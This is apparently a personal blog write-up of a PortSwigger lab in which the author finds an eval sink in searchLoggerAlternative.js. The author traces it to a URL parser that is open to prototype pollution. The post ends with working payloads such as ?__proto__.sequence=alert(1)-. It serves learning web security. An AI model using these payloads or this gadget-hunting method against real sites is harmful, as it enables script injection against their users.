---
title: PortSwigger - DOM XSS via an alternative prototype pollution vector
date: 2025-04-13 09:22:00 -5000
categories: [CTF]
tags: [ctf, web, prototype pollution]     # TAG names should always be lowercase
---

This lab is vulnerable to DOM XSS via client-side prototype pollution. To solve the lab:
1. Find a source that you can use to add arbitrary properties to the global `Object.prototype`.
2. Identify a gadget property that allows you to execute arbitrary JavaScript.
3. Combine these to call `alert()`.

![](/assets/portswigger/dom-xss-via-an-alternative-prototype-pollution-vector/0.png)

*Website Landing Page*

<br/>

When looking for Prototype pollution, we need find some logic that that:
1. Parses user supplied JSON
2. Constructs a JavaScript object in a way that prototype pollution can be introduced. This is usually through a merge function like so:
```jsx
for(var attr in source) {
    if(typeof(target[attr]) === "object" && typeof(source[attr]) === "object") {
        merge(target[attr], source[attr]);
    } else {
        target[attr] = source[attr];
    }
}
```

3. The user controlled object needs to end up in an XSS sink.

<br/>

# Finding the Sink
I prefer to search for the sinks in the application and then work my way backwards to see if that source is controllable. When searching through the JavaScript code, the following code block stood out in the `searchLoggerAlternative.js` file. 

```jsx
async function searchLogger() {
    window.macros = {};
    window.manager = {params: $.parseParams(new URL(location)), macro(property) {
            if (window.macros.hasOwnProperty(property))
                return macros[property]
        }};
    let a = manager.sequence || 1;
    manager.sequence = a + 1;

    eval('if(manager && manager.sequence){ manager.macro('+manager.sequence+') }');

    if(manager.params && manager.params.search) {
        await logQuery('/logger', manager.params);
    }
}

window.addEventListener("load", searchLogger);
```

<br/>

The `eval` function has a value that is potentially controllable. If we are able to control the `manager.sequence` value then we can get XSS.

<br/>

# Finding the Source

Now that we have the sink, lets work our way backwards to find where the `manager.sequence` is coming from. The `manager`value is being set just above with the following code: 

```jsx
window.manager = {params: $.parseParams(new URL(location)), macro(property) {
    if (window.macros.hasOwnProperty(property))
        return macros[property]
}};
```

<br/>

The `new URL(location)` is a controllable source.  The URL object is being passed into the `parseParams` function. The returned value from the function will be the value to the key `params`  in the `manager` object. If the `parseParams` is vulnerable to prototype pollution, then we will be able to add the key `sequence` to the `manager` object to get XSS.

The `parseParams` function below is quite long. Thankfully there is an explanation in the code’s comments.

```jsx
// Add an URL parser to JQuery that returns an object
// This function is meant to be used with an URL like the window.location
// Use: $.parseParams('http://mysite.com/?var=string') or $.parseParams() to parse the window.location
// Simple variable:  ?var=abc                        returns {var: "abc"}
// Simple object:    ?var.length=2&var.scope=123     returns {var: {length: "2", scope: "123"}}
// Simple array:     ?var[]=0&var[]=9                returns {var: ["0", "9"]}
// Array with index: ?var[0]=0&var[1]=9              returns {var: ["0", "9"]}
// Nested objects:   ?my.var.is.here=5               returns {my: {var: {is: {here: "5"}}}}
// All together:     ?var=a&my.var[]=b&my.cookie=no  returns {var: "a", my: {var: ["b"], cookie: "no"}}
// You just cant have an object in an array, ?var[1].test=abc DOES NOT WORK
(function ($) {
    var re = /([^&=]+)=?([^&]*)/g;
    var decode = function (str) {
        return decodeURIComponent(str.replace(/\+/g, ' '));
    };
    $.parseParams = function (query) {
        // recursive function to construct the result object
        function createElement(params, key, value) {
            key = key + '';
            // if the key is a property
            if (key.indexOf('.') !== -1) {
                // extract the first part with the name of the object
                var list = key.split('.');
                // the rest of the key
                var new_key = key.split(/\.(.+)?/)[1];
                // create the object if it doesnt exist
                if (!params[list[0]]) params[list[0]] = {};
                // if the key is not empty, create it in the object
                if (new_key !== '') {
                    createElement(params[list[0]], new_key, value);
                } else console.warn('parseParams :: empty property in key "' + key + '"');
            } else
                // if the key is an array
            if (key.indexOf('[') !== -1) {
                // extract the array name
                var list = key.split('[');
                key = list[0];
                // extract the index of the array
                var list = list[1].split(']');
                var index = list[0]
                // if index is empty, just push the value at the end of the array
                if (index == '') {
                    if (!params) params = {};
                    if (!params[key] || !$.isArray(params[key])) params[key] = [];
                    params[key].push(value);
                } else
                    // add the value at the index (must be an integer)
                {
                    if (!params) params = {};
                    if (!params[key] || !$.isArray(params[key])) params[key] = [];
                    params[key][parseInt(index)] = value;
                }
            } else
                // just normal key
            {
                if (!params) params = {};
                params[key] = value;
            }
        }
        // be sure the query is a string
        query = query + '';
        if (query === '') query = window.location + '';
        var params = {}, e;
        if (query) {
            // remove # from end of query
            if (query.indexOf('#') !== -1) {
                query = query.substr(0, query.indexOf('#'));
            }

            // remove ? at the begining of the query
            if (query.indexOf('?') !== -1) {
                query = query.substr(query.indexOf('?') + 1, query.length);
            } else return {};
            // empty parameters
            if (query == '') return {};
            // execute a createElement on every key and value
            while (e = re.exec(query)) {
                var key = decode(e[1]);
                var value = decode(e[2]);
                createElement(params, key, value);
            }
        }
        return params;
    };
})(jQuery);
```

<br/>

# Debugging

Sending the following typical prototype pollution payload results in an unexpected behavior.

```jsx
https://web-security-academy.net/?__proto__[sequence]=test
```

![](/assets/portswigger/dom-xss-via-an-alternative-prototype-pollution-vector/1.png)

If the JavaScript object notion doesn’t work. You should always try the dot notation too.

```jsx
https://web-security-academy.net/?__proto__.sequence=test
```

![](/assets/portswigger/dom-xss-via-an-alternative-prototype-pollution-vector/2.png)

<br/>

# Prototype Pollution

Now that we can pollution the `manager.sequence` object. We can get XSS because we have a sink in `eval`. 

```jsx
https://web-security-academy.net/?__proto__.sequence=alert(1)-
```

![](/assets/portswigger/dom-xss-via-an-alternative-prototype-pollution-vector/3.png)
